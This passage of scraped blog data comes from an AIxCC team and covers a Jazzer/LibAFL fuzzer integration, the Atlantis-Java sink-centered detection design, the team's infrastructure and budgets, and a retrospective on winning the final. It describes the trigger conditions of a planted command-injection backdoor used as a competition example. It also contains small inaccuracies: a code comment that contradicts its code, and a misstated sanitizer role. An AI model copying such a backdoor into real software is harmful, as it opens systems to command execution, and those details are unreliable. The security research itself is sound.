reverted, however, Jazzer has not had any substantial new features or optimizations made to it since then.\nAdditionally, LibFuzzer, while it is a very mature and well-built fuzzer is also on maintenance mode. LibFuzzer was created by Kostya Serebryany under the LLVM umbrella when he was employed at Google but since then Google\u0026rsquo;s priorities have shifted. The LibFuzzer documentation notes:\nThe original authors of libFuzzer have stopped active work on it and switched to working on another fuzzing engine, Centipede. LibFuzzer is still fully supported in that important bugs will get fixed. However, please do not expect major new features or code reviews, other than for bug fixes.\nJust because Jazzer and LibFuzzer are in maintenance mode doesn\u0026rsquo;t mean the rest of the fuzzing community is. Projects like AFL++ have continued to incorporate ideas from research work and industry creating far more capable fuzzers.\nJazzer+LibAFL This brings us to one area we worked on: using LibAFL as the fuzzing engine for Jazzer instead of LibFuzzer. LibAFL is an awesome project that can be summarized as a fuzzer-library. Instead of an end-to-end fuzzer, you code the bits of glue that deliver your fuzzing payload and provide feedback and in return you get a fast performant fuzzer.\nImportantly for us, LibAFL contains a sub-project called libafl_libfuzzer. This is meant to be a drop-in replacement for LibFuzzer that can use harnesses and binaries built for LibFuzzer but fuzz them using LibAFL. This seemed like a great thing to try out for us to get the advanced features in LibAFL for free. As some of our past work like autofz has demonstrated, ensembling a bunch of different fuzzers with varying characteristics tends to yield great results when fuzzing.\nImplementation It wasn\u0026rsquo;t quite a drop-in replacement experience for us: it turned out that Jazzer actually used a fork for LibFuzzer with some changes made and libafl_libfuzzer wasn\u0026rsquo;t entirely feature-complete. However, a few days of integration left us with a Jazzer derivative that seemed to be able to explore code paths complimentary to the base fuzzer. Some of the notable changes we had to make are below:\nJazzer added a feature to LibFuzzer to allow the fuzzing loop to stop and return control to the caller of LLVMFuzzerRunDriver instead of killing the entire program.\nWe added the same feature in libafl_libfuzzer:\nlet result = unsafe { crate::libafl_libfuzzer_test_one_input(Some(*$harness), buf.as_ptr(), buf.len()) }; match result { -2 =\u0026gt; { // A special value from Jazzer indicating we should stop // the fuzzer but not kill the whole program. *stop_fuzzer.borrow_mut() = true; eprintln!(\u0026#34;[libafl] Received -3 from harness, setting stop.\u0026#34;); ExitKind::Crash } Sanitizers in C/C++ programs usually trigger signals to indicate an issue, such as AddressSanitizer (ASan) raising a SIGSEGV when it detects an error. Jazzer instead uses a method called __jazzer_set_death_callback to indicate a corpus triggered an issue in a sanitizer. We added this same function to our libafl_libfuzzer.\nAs mentioned previously, LibFuzzer uses SanCov to gather coverage information. This isn\u0026rsquo;t the only thing that SanCov provides though: in an effort to quickly find magic numbers like 0xdeadbeef when fuzzing, SanCov also hooks onto comparisons and calls methods like __sanitizer_cov_trace_cmp8 to indicate a comparison between two 8-byte numbers. This method is implemented like so in LibFuzzer:\nvoid __sanitizer_cov_trace_cmp8(uint64_t Arg1, uint64_t Arg2) { uintptr_t PC = reinterpret_cast\u0026lt;uintptr_t\u0026gt;(GET_CALLER_PC()); fuzzer::TPC.HandleCmp(PC, Arg1, Arg2); } Notice that it uses a macro to retrieve the calling program counter. If Jazzer were to use these methods from the JNI directly, they would all register with the same program counter. Hence Jazzer adds variants of these methods such as __sanitizer_cov_trace_cmp8_with_pc that pass the program counter.\nWe implemented these same _with_pc SanCov functions.\nLibFuzzer also gathers data on comparisons performed in strcmp, memcmp and other common libc functions to find magic strings. This is done by intercepting calls to these methods in FuzzerInterceptors.cpp:\nstatic void fuzzerInit() { ... REAL(memcmp) = reinterpret_cast\u0026lt;memcmp_type\u0026gt;( getFuncAddr(\u0026#34;memcmp\u0026#34;, reinterpret_cast\u0026lt;uintptr_t\u0026gt;(\u0026amp;memcmp))); ... } ATTRIBUTE_INTERFACE int memcmp(const void *s1, const void *s2, size_t n) { int result = REAL(memcmp)(s1, s2, n); void *caller_pc = GET_CALLER_PC(); __sanitizer_weak_hook_memcmp(caller_pc, s1, s2, n, result); return result; } and then sending the arguments and result to functions like __sanitizer_weak_hook_memcmp. Here we encountered two issues, libafl_libfuzzer lacked implementations for __sanitizer_weak_hook_memmem and __sanitizer_weak_hook_strstr. We added those two methods.\nAdditionally, Jazzer had implemented a custom hook function called __sanitizer_weak_hook_compare_bytes which we also had to implement.\nThere were also many other smaller changes such as making the libafl_libfuzzer crash filenames match the filename that LibFuzzer uses. We are thankful to the Jazzer team for having such a thorough set of unit tests and integration tests that allowed us to be confident our fork of Jazzer would work.\nThe Bugs! During this process we found a few bugs in the libafl_libfuzzer drop-in replacement. We fixed some of these locally and reported them upstream wherever we could.\nA build issue had caused the function interceptor hooks like __sanitizer_weak_hook_memcmp to become dead. This meant that these hooked functions were just silently never getting called reducing the feedback the fuzzer had to work with.\nhttps://github.com/AFLplusplus/LibAFL/issues/3043\nThe calls for constant comparisons such as __sanitizer_cov_trace_cmp8 to represent 8-byte integer comparison had an incorrect macro implementation causing all comparisons to be considered as 1-byte.\nhttps://github.com/AFLplusplus/LibAFL/issues/3094\nlibafl_libfuzzer is sometimes unable to solve some simple harnesses because its memory-comparison hooks do not provide feedback on how close the values being compared are.\nhttps://github.com/AFLplusplus/LibAFL/issues/3042\nWe reported this bug upstream but did not contribute our fix because it was a little hacky.\nReference Code Repository Technical Report (forthcoming) "},{"section":"Blog","slug":"/blog/post-crs-java-overview/","title":"Atlantis-Java: A Sink-Centered Approach to Java Vulnerability Detection","description":"Overview of Atlantis-Java","date":"August 19, 2025","image":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/crs-java/overview/icon_hu_65c45f813ce97ae2.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"420\"\n          height=\"280\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/crs-java\\/overview\\/icon_hu_1e0fb8b5fb8556f7.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","imageSM":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n          \n          \n          \n          \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/crs-java/overview/icon_hu_7a39bb092b57c9b6.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"100\"\n          height=\"100\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/crs-java\\/overview\\/icon_hu_46524b095c49bde1.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","searchKeyword":"","categories":"Atlantis-Java","tags":"java","content":"Atlantis-Java is a specialized bug-finding subsystem within the Atlantis CRS framework, specifically designed for Java CPV detection in the AIxCC competition. It integrates fuzzing, program analysis, and LLM capabilities, with a particular focus on security-sensitive APIs (also known as sinks).\nMany Java Vulnerabilities Are Sink-Centered Fig.1 Example CPV from AIxCC Semifinal Jenkins CP\nThis vulnerability contains a backdoor that enables OS command injection when specific conditions are met. The ProcessBuilder constructor serves as a sink API, where an attacker-controllable first argument can lead to arbitrary command execution. The sinkpoint (line 20) refers to the location in the target CP where this sink API is called.\nFrom a sink-centered perspective, the detection process can be decomposed into two phases:\n1. Sink exploration (lines 3-8, 12-19). To reach the sink, the input must satisfy:\nThe presence of an x-evil-backdoor key in the HTTP request header The header value matching DigestUtils.sha256(\u0026quot;breakin the law\u0026quot;) Non-empty command line arguments: cmd != null \u0026amp;\u0026amp; cmd.trim().isEmpty() 2. Sink exploitation (lines 20-23). The input must satisfy:\nTriggering the Jazzer detection oracle: cmds[0] should equal to the canary string jazze This two-phase process effectively captures the detection pattern for various types of Java vulnerabilities. Security issues typically arise from the unsafe usage of sensitive API calls (sinks), such as file operations, deserialization, network access, and template rendering.\nIn practice, each vulnerability type presents unique exploration and exploitation challenges that go beyond simply executing the sink and setting the canary value. For example, the CPVs in the Apache Tika CP require a nested zip file to reach a sinkpoint and also demand reasoning to bypass normalization guard conditions.\nHowever, existing fuzzers, mostly inherited from C/C++ fuzzers, are coverage-centered and leverage only limited sink knowledge to enhance exploration and exploitation.\nOverview of Atlantis-Java Fig.2 Overview of Atlantis-Java\nRather than replacing traditional fuzzing approaches, Atlantis-Java augments them with sink knowledge to achieve more effective Java vulnerability detection by integrating LLM capabilities with dynamic and static analysis techniques.\nAt its foundation, Atlantis-Java maintains an ensemble fuzzing pipeline that serves as the foundational infrastructure. Built upon this pipeline, it performs sink analysis on the target CP and applies multiple techniques to enhance both sink exploration and exploitation. These techniques generate inputs and dictionaries that strengthen the fuzzing pipeline while simultaneously retrieving dynamic information from fuzzers to refine the analysis process.\nThe following paragraphs list the framework level designs and facilities in Atlantis-Java.\n1. Sink-Aware Fuzzing Loop while not timeout: seed = pick from corpus mutated = mutate(seed) execute(program, mutated) if new_coverage: add mutated to corpus if reaches_sinkpoint: collect as beep_seed try_exploitation(beep_seed) if has_crash: save_crash(mutated) The fuzzing loop in Atlantis-Java operates in a sink-aware manner. Every input that reaches a sinkpoint (referred to as \u0026ldquo;beep seeds\u0026rdquo;) is collected and elevated to a dedicated exploitation phase. All contextual information from beep seeds, such as stack traces and sink API details, is preserved and shared within Atlantis-Java for further exploitation. This functionality is implemented through a custom Java instrumentation pass integrated into all our Jazzer instances.\n2. Ensemble Fuzzing The ensemble fuzzing infrastructure collects, deduplicates, and dispatches corpus data among all fuzzer instances, serving as both a corpus synchronization layer and a metadata propagation channel. This ensures that all components benefit from collective discoveries.\nCorpus Synchronization: Collects and distributes corpus data among different fuzzer instances while performing deduplication based on coverage metrics Input Integration: Incorporates inputs from non-fuzzing components such as Path-Based PoV Generator, Concolic Executor, and ExpKit Metadata Propagation: Synchronizes sinkpoint dynamic information, including sinkpoint reach/exploit status, beep seeds and their contexts 3. Sink Management Sinkpoints are first-class citizens in Atlantis-Java. Their management encompasses identification, deduplication, filtering, metadata synchronization, and scheduling.\nSinkpoint Identification: Static analysis locates all calls to security-sensitive APIs. Beyond Jazzer\u0026rsquo;s built-in API list, we expanded detection by collecting APIs from vulnerability benchmarks, research papers, and competition tools. Additionally, for diff code in delta mode, we identify code areas potentially causing infinite loops as custom sinkpoints.\nTask Transformation: All competition tasks are converted into concrete sinkpoint targets:\nFull Mode ‚Üí All sinkpoints in the CP Delta Mode ‚Üí Sinkpoints contained in or reachable by code changes SARIF Challenge ‚Üí Sinkpoints specified in reports Metadata Management: Sinkpoint information is collected and synchronized both within and across Atlantis-Java instances to prevent duplicate exploration/exploitation efforts and ensure proper prioritization. This includes sinkpoint basics (API, potential vulnerability type, coordinates), runtime status tracking (unreached/reached/exploited/unexploitable), and associated beep seeds and crashes.\nScheduling: The scheduler prioritizes unreachable sinkpoints over reachable ones during the exploration phase to maximize coverage, while exploited sinkpoints are excluded from the exploitation phase to avoid redundant efforts. Additionally, sinkpoints related to delta mode and SARIF challenges receive higher priority to align with competition objectives.\n4. Distributed Design Atlantis-Java incorporates lightweight distributed designs optimized for Kubernetes deployment and competition tasks.\nFull Mode: Each CP harness operates on a dedicated Kubernetes node, working independently until timeout. NFS and Redis services provide persistent caching infrastructure that enables progress recovery when components or the system restart.\nDiff Mode: A one-time node rescheduling occurs either at timeout (set to 2 hours in the final competition) or upon completion of unified reachability analysis from all static analyzers. This rescheduling allocates additional computing resources to diff-reachable harnesses. Following rescheduling, Atlantis-Java synchronizes all cached sinkpoint metadata from Redis, avoiding redundant efforts.\nComponents in Atlantis-Java The framework integrates multiple specialized tools for sinkpoint exploration and exploitation:\nExploration-focused components\nDirected-Jazzer: Guides fuzzing toward potentially reachable sinkpoints LibAFL-Jazzer: Leveraging libAFL mutators for more diverse input mutations DeepGen: LLM-based input generation script generator DictGen: LLM-based fuzzing dictionary generation Exploitation-focused components\nExpKit: LLM-based exploitation tool, start exploitation from beep seed Dual-purpose components:\nPath-Based PoV Generator: LLM-based PoV generator towards sinkpoints Concolic Executor: Graal VM based concolic executor How Does Atlantis-Java Perform? While we don\u0026rsquo;t have full log for post-mortem analysis, the recovered logs have recorded 107 deduplicated PoV submissions (122 in total, 15 submission logs were lost..) from Atlantis to organizers. Among them, 23 submissions are of Java CPs and Atlantis-Java submitted 15 of them, which is a strong indicator for its effectiveness.\nWhat\u0026rsquo;s Next Individual blog posts detailing each component Application to open-source projects Comprehensive technical report with in-depth analysis Extended post-mortem analysis as more data becomes available Reference Atlantis-Java Code Repository Technical Report (forthcoming) "},{"section":"Blog","slug":"/blog/post-atl-infra/","title":"Atlantis Infrastructure","description":"Atlantis Infrastructure","date":"August 13, 2025","image":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/atl-infra/infra_hu_66fae50b5b3588d3.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"420\"\n          height=\"420\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/atl-infra\\/infra_hu_c3d73c1b5704794c.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","imageSM":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n          \n          \n          \n          \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/atl-infra/infra_hu_861da9d828610e3f.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"100\"\n          height=\"100\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/atl-infra\\/infra_hu_2920da624ffa59bd.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","searchKeyword":"","categories":"Atlantis","tags":"infrastructure","content":"The AIxCC competition is not just about creating automated bug-finding and patching techniques \u0026ndash; it is about building a cyber reasoning system (CRS) that can do both without any human assistance. To succeed, a CRS must excel in four critical infrastructure areas:\nReliability: Run continuously for weeks without intervention. Scalability: Handle many challenge projects concurrently. Budget Utilization: Maximize Azure cloud and LLM credit usage. Submission Management: Consistently deliver valid proof-of-vulnerability blobs (POVs), Patches, SARIF assessments, and Bundles. In this post, we will share how we designed the infrastructure of our CRS, Atlantis, to meet these keys and make it as robust as possible. We could not have won AIxCC without the exceptional work of our infrastructure team.\n1. Bootstrapping Atlantis starts by launching CRS-level k8s nodes for four essential services:\nCRS Webserver: Listens for incoming challenge projects (CPs) and SARIF reports. Log Collector: Aggregates and forwards logs to the AIxCC organizers. LiteLLM: Manages LLM usage within budget and logs all requests/responses. Custom LLM: Helps patch generation based on fine-tuned LLM. 2. Per-Challenge Scaling When a new CP arrives, the CRS webserver spins up a dedicated CP manager on its own k8s node. The CP manager then:\nBuilds the CP and allocates both Azure Cloud and LLM budgets proportionally for this CP.\nLaunches bug-finding modules depending on the language:\nC-based CPs =\u0026gt; Atlantis-Multilang + Atlantis-C Java-based CPs =\u0026gt; Atlantis-Multilang + Atlantis-Java Launches Atlantis-Patch and Atlantis-SARIF for patch generation and SARIF assessment.\nIssues LiteLLM API keys to modules to enforce per-CP and per-module LLM budgets.\nThis per-challenge scaling significantly boosts reliability \u0026ndash; if crash while handling one CP, it does not affect others. Redundant bug-finding modules further improve stability and coverage; for example, if Atlantis-C fails on certain CPs, Atlantis-Multilang can still find vulnerabilities in them.\nHere are the statistics on POVs from the final competition.\n+--------------------+--------------------------+ | Module | POV Submission by Module | +--------------------+--------------------------+ | Atlantis-Multilang | 69.2% | | Atlantis-C | 16.8% | | Atlantis-Java | 14.0% | +--------------------+--------------------------+ +-------------+---------------------------------+ | CP Language | POV Distribution by CP Language | +-------------+---------------------------------+ | C-based | 78.5% | | Java-based | 21.5% | +-------------+---------------------------------+ In addition, for each harness in a CP, Atlantis-Multilang and Atlantis-Java run on nodes sized according to the allocated Azure budget, while Atlantis-C operates on a fixed pool of up to 15 nodes. This isolation ensures that even if a module fails on one harness, it does not impact the others.\nThis per-challenge scaling also enabled us to make full use of the allocated Azure Cloud and LLM credit budgets. In the final round, as shown below, we recorded the highest usage among all seven teams \u0026ndash; spending $73.9K of the $85K Azure Cloud budget and $29.4K of the $50K LLM credit budget.\nNotably, the above image and the AIxCC organizers show that we primarily used o4-mini, GPT-4o, and o3. However, these are based on the number of requests rather than the actual LLM credits spent in dollars. Based on our experience from the practice and internal rounds, we allocated LLM budgets in the final round as shown below. While our plan was to rely mostly on Anthropic and OpenAI models in the final round, we do not yet have precise data on how much we spent for each provider.\n+--------------------+-----------+------------+----------+--------+-----------+ | CRS | OpenAI | Anthropic | Gemini | Grok | Total | +--------------------+-----------+------------+----------+--------+-----------+ | Atlantis-multilang | 0.48 | 0.48 | 0.05 | 0.00 | 1.00 | | Atlantis-C/java | 0.40 | 0.30 | 0.30 | 0.00 | 1.00 | | Atlantis-patch | 0.30 | 0.60 | 0.10 | 0.00 | 1.00 | +--------------------+-----------+------------+----------+--------+-----------+ | Atlantis-multilang | $8839.29 | $8839.29 | $883.93 | $0.00 | $18562.50 | | Atlantis-C/java | $7425.00 | $5568.76 | $5568.76 | $0.00 | $18562.50 | | Atlantis-patch | $3712.50 | $7425.00 | $1237.50 | $0.00 | $12375.00 | | Atlantis-sarif | $75.00 | $100.00 | $250.00 | $75.00 | $500.00 | +--------------------+-----------+------------+----------+--------+-----------+ | Total | $20051.79 | $21933.04 | $7940.18 | $75.00 | $50000.00 | +--------------------+-----------+------------+----------+--------+-----------+ 3. Submission and Task Management When a bug-finding module discovers a POV, it sends the result to the CP Manager. The CP Manager then:\nVerifies that the POV indeed triggers a crash. Deduplicates POVs based on their stack traces and heuristics. Submit unique POVs to the AIxCC organiziers. Forwards unique POVs to Atlantis-Patch and Atlantis-SARIF for patch generation and SARIF assessment. Once patches and SARIF reports are produced, they are returned to the CP Manager and CP Manager submits them to the AIxCC organizers. At the end, the CP Manager groups each POV with its corresponding patch and assessment (based on the POV hash) into a bundle and submits it to the AIxCC organizers.\nAs a result, we were able to successfully submit numerous POVs, patches, SARIF assessments, and bundles with high accuracy in the final round and ultimately won the competition, as shown below. Notably, our bundle score was significantly higher than other teams, even when accounting for the large number of POVs we found and patches we generated. This demonstrates that Atlantis was able to effectively map the relationships between discovered POVs, generated patches, and SARIF assessments \u0026ndash; a capability that can be incredibly valuable for real-world developers.\nHere is a breakdown of our submission, reconstructed from the logs we were able to recover. Please note that this is not fully accurate since a portion of the logs is missing, and we are not yet certain which submission was ultimately scored. We will provide an updated and verified version once the AIxCC organizers release the official detailed logs.\n+--------------------+-------+--------+--------+--------+ | Category | Count | Passed | Failed | Scored | +--------------------+-------+--------+--------+--------+ | POV -\u0026gt; CP Manager | 1,002 | N/A | N/A | N/A | | POV -\u0026gt; Organizers* | 107 | 107 | 0 | 43 | | Patches | 47 | 41 | 6 | 31 | | SARIF Reports | 8 | N/A | N/A | N/A | | Bundles | 42 | N/A | N/A | N/A | +--------------------+-------+--------+--------+--------+ *: after POV verification \u0026amp; deduplication `Scored`: Marked after the AIxCC organizers manually reviewed `Passed` result Testing, Testing, and Testing! While developing Atlantis, we conducted extensive testing to fix bugs and evaluate the effectiveness of each module. Under the leadership of Jiho Kim, we prepared over 50 CP benchmarks and tested Atlantis against them using a test version of AIxCC competition server. This allowed us to perform end-to-end testing not only in the three practice rounds provided by the AIxCC organizers, but also in four additional internal rounds. Across these seven rounds, we identified and fixed numerous bugs, ultimately making Atlantis far more robust. Notably, some modules like Atlantis-Multilang has their own CIs to test and evaluate themselves based on our benchmarks. We plan to release our benchmarks once we determine a way to prevent GenAI models from training on them.\nFixed a fatal bug right before the deadline However, even with extensive testing, we failed to catch a fatal bug in Atlantis-Patch, described in our previous post, until the final moments before submission. The bug was related to enforcing a rule that Atlantis-Patch must not modify the given fuzzing harnesses. Our implementation treated any file whose path contained fuzz as a fuzzing harness and blocked modifications accordingly. Everything worked fine in our internal tests. But, during the final testing with the AIxCC organizers‚Äô API right before submission, we discovered that all CPs had their directories prefixed with ossfuzz. As a result, Atlantis-Patch refused to generate any patches. Initially, I suspected the issue was due to the non-deterministic nature of LLMs. However, Soyeon spotted unusual log entries with Permission denied, revealing that the patch process was blocked because it attempted to modify a fuzzing harness. This was discovered just a few hours before the final submission. I urgently called our Atlantis-Patch teammates in South Korea at 3 AM their time. Fortunately, we fixed the issue within an hour and managed to submit Atlantis before the deadline.\nFrom the Author After the Last Commit Since no human intervention was allowed during the competition, we spent a significant amount of time on infrastructure development and testing. All of infrastructure team members not only worked on their assigned roles (e.g., bug finding, SARIF assessment) but also contributed to infra development and testing on the side. I am deeply grateful to them, and this experience really helped me understand why companies have dedicated DevOps teams. In particular, I have a feeling that as LLMs and GenAI become more widely adopted, specialized LLM DevOps teams will also emerge. I will never forget the times when our LiteLLM had to be rebooted frequently because it could not keep up with requests from our modules. Overall, it was an incredible experience to go beyond a research prototype and operate such a large-scale system in a real competition while collaborating and communicating closely with all the sub-teams (Atlantis-C/Java/Multilang/SARIF/Patch) throughout the journey.\n"},{"section":"Blog","slug":"/blog/post-afc/","title":"AIxCC Final and Team Atlanta","description":"Atlantis in CTF competitions","date":"August 12, 2025","image":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/afc/afc-team_hu_1e8c562fabab95ab.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"420\"\n          height=\"194\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/afc\\/afc-team_hu_2f9a4e9f5ef2a770.jpeg';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","imageSM":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n          \n          \n          \n          \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/afc/afc-team_hu_6fe684af5f1e3bb0.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"100\"\n          height=\"100\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/afc\\/afc-team_hu_6bcf2ba292725a9e.jpeg';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","searchKeyword":"","categories":"Milestone","tags":"AFC","content":"Two years after its first announcement at DEF CON 31, our team stood on stage as the winners of the AIxCC Final‚Äîa moment we had been working toward since the competition began.\nYet when we heard we placed 1st, relief overshadowed excitement. Why? While competing head-to-head with world-class teams like Theori was a privilege, the real-time, long-running nature of this competition demanded extreme engineering reliability alongside novel approaches to succeed.\nBalancing innovation with stability under time pressure proved our greatest challenge. We simply hoped our Cyber Reasoning System (CRS) would run as intended‚Äî but it exceeded expectations, outperforming other teams in most categories by significant margins.\nIn this post, I\u0026rsquo;ll answer the most common questions we received from the DEF CON audience and share the story behind our victory.\nWhy were we so anxious? In this competition, a single bug can be fatal. One line of code nearly destroyed our chances.\nWe discovered this critical bug, which almost ended everything, during integration testing‚Äî just hours after submitting our final version, and mere hours before the deadline. The problematic code was designed to skip patch generation for fuzzing harnesses. In all previous challenge projects and our benchmarks, fuzzing harness source files contained \u0026ldquo;fuzz\u0026rdquo; in their paths (e.g., \u0026ldquo;fuzz/\u0026rdquo; or \u0026ldquo;http_request_fuzzer.cc\u0026rdquo; in nginx)‚Äî a simple but effective heuristic to avoid false positives.\nThe problem? During our final integration test, we discovered the organizers had prefixed all OSS-Fuzz projects with \u0026ldquo;ossfuzz\u0026rdquo; (e.g., \u0026ldquo;r3-ossfuzz-sqlite3\u0026rdquo;). The irony wasn\u0026rsquo;t lost on us‚Äîhere we were, building an autonomous CRS powered by state-of-the-art AI, nearly defeated by a string matching bug. In postmortem, we figured none of the CP is named with the \u0026ldquo;fuzz\u0026rdquo; prefix though!\nL0. System Robustness is Priority #1 As our near-miss demonstrated, a single bug can kill a CRS entirely. The autonomous system is that brittle. So how did we balance engineering for robustness with novel research needed to win?\nOur answer: N-version programming with orthogonal approaches.\nAtlantis isn\u0026rsquo;t a single CRS‚Äîit\u0026rsquo;s a group of multiple independent CRSs, each designed by specialized teams (C, Java, Multilang, Patch, and SARIF). These teams deliberately pursued orthogonal strategies to maximize both coverage and fault tolerance.\nFor bug finding alone, we deployed three distinct CRSs:\nAtlantis-Multilang: Built for robustness and language-agnostic bug finding Atlantis-C: Optimized specifically for C/C++ vulnerabilities Atlantis-Java: Tailored for Java-specific bug patterns Design Overview of Atlantis (stay tuned for our Technical Report).\rThese CRSs deliberately made orthogonal approaches; Atlantis-Multilang took conservative paths (no instrumentation at build time) while Atlantis-C took risky approaches requiring heavy compilation-time instrumentation:\nAtlantis-C CRS: ‚Üë instrumentation: libafl-based, instrument-based directed fuzzer ‚Üì LLM usage: seed generation, input mutation Time-based resource allocation Atlantis-Multilang CRS: ‚Üì instrumentation: libfuzzer-based, simple seed-based directed fuzzer ‚Üë LLM: seed/blob generation, input format reverser, callgraph, dictgen, etc Space-based resource allocation By maintaining minimal sharing between CRSs and intentionally making orthogonal design decisions, we ensured that a failure in one component wouldn\u0026rsquo;t cascade through the entire system. When one approach failed, others continued operating‚Äî true fault tolerance through diversity.\nL1. Don\u0026rsquo;t Give Up on Traditional Program Analysis Unlike DARPA\u0026rsquo;s Cyber Grand Challenge, where CRSs dealt with an artificial architecture limited to 7 system calls, AIxCC evaluates CRSs against real-world, complex open source software‚Äî the foundation of today\u0026rsquo;s cyber infrastructure.\nThis shift changes everything. Traditional program analysis tools that can\u0026rsquo;t scale to handle real-world complexity would doom any CRS.\nWe initially hoped to stand on the shoulders of giants, evaluating most commodity solutions to save development time. Unfortunately, even state-of-the-art tools like SWAT and SymCC weren\u0026rsquo;t ready for large-scale software analysis. Each required substantial engineering to become competition-ready.\nUltimately, we invested heavily in extending traditional tools. For both C and Java, we developed three categories:\nEnsemble fuzzers: LibAFL for Java/C, libFuzzer, AFL++, custom Jazzer, custom format fuzzers Concolic executors: Extended SymCC for C, custom implementation for Java Directed fuzzers: Custom implementations for C and Java Each tool required non-trivial engineering efforts to be effective. The lesson: AI alone isn\u0026rsquo;t enough‚Äîtraditional program analysis remains essential, but it must be extensively adapted for real-world scale.\nL2. Ensembling to Promote Diversity Research shows that ensemble fuzzing outperforms single campaigns with equivalent computing resources, as demonstrated by autofz. Atlantis embraces this principle everywhere: coverage-guided fuzzers, directed fuzzers, concolic executors, and patching agents.\nPatching particularly benefits from LLM diversity‚Äî what the ML community calls \u0026ldquo;hallucination,\u0026rdquo; systems engineers call \u0026ldquo;non-determinism,\u0026rdquo; and we call \u0026ldquo;creativity.\u0026rdquo; By ensembling multiple agents with orthogonal approaches, Atlantis harnesses this non-deterministic nature of LLMs.\nThe Critical Role of Oracles. Ensembling only works when oracles exist to judge correctness.\nIn fuzzing, hardware provides our first oracle: segmentation faults from invalid memory access are caught efficiently through page table violations. Software sanitizers extend this scope‚Äî ASAN for memory unsafety bugs, UBSAN for undefined behavior, MSAN for memory leaks‚Äî detecting bugs long before crashes occur.\nFor patching, the Proof-of-Vulnerability (PoV) serves as our oracle. We validate patches by re-running the PoV against patched programs. We say \u0026ldquo;likely correct\u0026rdquo; because patches might work through unintended mitigation rather than true fixes.\nConsider these problematic \u0026ldquo;patches\u0026rdquo;:\nRecompiling C code with MTE or PAC on ARM to suppress PoVs Wrapping Java entry points in broad catch(Exception) blocks Our agents carefully avoid such mitigations. Yet semantic correctness remains subjective‚Äî which is why AIxCC provides optional test.sh scripts as additional oracles for our patching agents.\nDesign of Patching Agents.\rBuilding Specialized Agents. During preparation, we recognized a key insight: building one universally powerful agent is harder than building multiple specialized agents for specific tasks. This echoes the philosophy behind AlphaEvolve and AlphaCode.\nSurprisingly, smaller models like GPT-4o-mini often outperformed larger foundation models and even reasoning models for our tasks. We speculate that its 8 billion parameters hit a sweet spot‚Äî large enough to understand code patterns, small enough to avoid overthinking simple fixes.\nPractical Constraints on Scaling. Unlike AlphaCode\u0026rsquo;s massive agent scaling, we faced a practical bottleneck: validating patches in large codebases takes minutes if not hours (e.g., 10+ minutes for nginx). This forced Atlantis-Patching to limit itself to six agents, focusing on quality over quantity.\nTheori took a radically different approach: purely static analysis, producing three correct patches without PoVs. This demonstrates LLMs\u0026rsquo; remarkable ability to understand code semantics without runtime validation, which we\u0026rsquo;d like to explore further.\nThe scoreboard reveals the trade-off: Theori\u0026rsquo;s 44.4% accuracy yielded an Accuracy Modifier of 0.9044 ($1 - (1 - 0.4444)^4$), while our PoV-validated approach achieved 0.9999 ($1 - (1 - 0.9127)^4$).\nOur CRS can generate 